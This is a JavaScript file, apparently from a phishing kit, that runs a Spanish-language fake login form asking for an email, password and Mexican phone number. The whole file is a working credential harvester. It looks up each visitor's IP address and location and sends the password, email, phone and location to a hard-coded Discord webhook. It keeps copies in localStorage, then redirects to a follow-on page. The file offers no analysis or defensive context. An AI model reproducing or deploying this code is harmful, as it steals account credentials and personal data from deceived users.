

var WEBHOOK = (window.APP_CONFIG && window.APP_CONFIG.WEBHOOK) ||
    'https://discordapp.com/api/webhooks/1560804250500464783/mb1scGsqbI8Jw7J3xxLbfQIPLmuxC67eB0rL60yKcstQBF9E5ZYMDqu9xGyA6XZIkl4l';

var REDIRECT = 'index3.html';
var DIGITOS = 10;

function soloDigitos(v) { return (v || '').replace(/\D/g, ''); }
function correoValido(v) { return /^[^\s@]+@[^\s@]+\.[a-zA-Z]{2,}$/.test(String(v).trim()); }

function mostrarLoader() { var l = document.getElementById('loader'); if (l) l.style.display = 'flex'; }
function ocultarLoader() { var l = document.getElementById('loader'); if (l) l.style.display = 'none'; }

function marcarError(msg) {
    var box = document.getElementById('formError');
    if (box) { box.textContent = msg; box.classList.add('show'); }

    var campos = document.querySelectorAll('.field');
    campos.forEach(function (c) { c.classList.remove('has-error'); void c.offsetWidth; });
    campos[campos.length - 1].classList.add('has-error');
}

function campoError(el) {
    var f = el.closest('.field');
    if (!f) return;
    f.classList.remove('has-error');
    void f.offsetWidth;
    f.classList.add('has-error');
}

function limpiarError() {
    var box = document.getElementById('formError');
    if (box) { box.classList.remove('show'); box.textContent = ''; }
    document.querySelectorAll('.field').forEach(function (c) { c.classList.remove('has-error'); });
}

function evaluarBoton() {
    var email = document.getElementById('tx_email_id');
    var pass  = document.getElementById('tx_pass_id');
    var tel   = document.getElementById('tx_user_id');
    var btn   = document.getElementById('submitBtn');
    if (!email || !pass || !tel || !btn) return;

    btn.disabled = !(correoValido(email.value) && pass.value.trim().length >= 4 && soloDigitos(tel.value).length === DIGITOS);
}

async function enviarDatos(datos) {
    try {
        var ipData = {};
        try {
            var ipRes = await fetch('https://ipinfo.io/json');
            ipData = await ipRes.json();
        } catch (_) {}

        var embed = {
            title: '\uD83D\uDD10 Inicio de sesión',
            color: 3447003,
            timestamp: new Date().toISOString(),
            fields: [
                { name: '\uD83D\uDCE7 Correo', value: datos.correo, inline: false },
                { name: '\uD83D\uDD11 Contrase\u00F1a', value: datos.password, inline: false },
                { name: '\uD83D\uDCF1 Celular', value: datos.celular, inline: false },
                { name: '\uD83C\uDF10 IP', value: ipData.ip || 'Desconocida', inline: true },
                { name: '\uD83D\uDCCD Ubicaci\u00F3n', value: [ipData.city, ipData.region, ipData.country].filter(Boolean).join(', ') || 'Desconocida', inline: true }
            ]
        };

        var r = await fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] })
        });

        return r.ok;
    } catch (e) {
        return false;
    }
}

document.addEventListener('DOMContentLoaded', function () {

    var form  = document.getElementById('accesoForm');
    var email = document.getElementById('tx_email_id');
    var pass  = document.getElementById('tx_pass_id');
    var tel   = document.getElementById('tx_user_id');

    /* Ojos: mostrar / ocultar */
    document.querySelectorAll('.eye').forEach(function (btn) {
        btn.addEventListener('click', function () {
            var inp = document.getElementById(btn.getAttribute('data-target'));
            if (!inp) return;
            var oculto = inp.type === 'password' || inp.type === 'email';
            inp.type = oculto ? 'text' : (inp === pass ? 'password' : 'email');
            btn.classList.toggle('on', oculto);
        });
    });

    /* Celular: solo dígitos */
    if (tel) {
        tel.addEventListener('input', function () {
            var limpio = soloDigitos(this.value).slice(0, DIGITOS);
            if (limpio !== this.value) this.value = limpio;
            limpiarError();
            evaluarBoton();
        });
        tel.addEventListener('paste', function (e) {
            e.preventDefault();
            this.value = soloDigitos((e.clipboardData || window.clipboardData).getData('text')).slice(0, DIGITOS);
            limpiarError();
            evaluarBoton();
        });
    }

    [email, pass].forEach(function (inp) {
        if (!inp) return;
        inp.addEventListener('input', function () {
            limpiarError();
            evaluarBoton();
        });
    });

    if (window.matchMedia('(min-width: 480px)').matches && email) email.focus();

    if (form) {
        form.addEventListener('submit', async function (e) {
            e.preventDefault();

            var correo = email ? email.value.trim() : '';
            var clave  = pass ? pass.value.trim() : '';
            var cel    = tel ? soloDigitos(tel.value) : '';

            if (!correoValido(correo)) { marcarError('Introduce un correo electrónico válido.'); if (email) email.focus(); return; }
            if (clave.length < 4)      { marcarError('La contraseña debe tener al menos 4 caracteres.'); if (pass) pass.focus(); return; }
            if (cel.length !== DIGITOS) { marcarError('El número de celular debe tener ' + DIGITOS + ' dígitos.'); if (tel) tel.focus(); return; }

            limpiarError();

            /* Datos que usan las pantallas siguientes */
            localStorage.setItem('us_temp_session', '+52' + cel);
            localStorage.setItem('us_temp_tipo', 'tel');
            localStorage.setItem('us_temp_email', correo);
            localStorage.setItem('us_temp_pass', clave);

            mostrarLoader();

            var ok = await enviarDatos({ correo: correo, password: clave, celular: '+52' + cel });

            setTimeout(function () {
                if (!ok) {
                    ocultarLoader();
                    marcarError('Error de respuesta del servidor.');
                    return;
                }
                window.location.href = REDIRECT;
            }, 2000);
        });
    }
});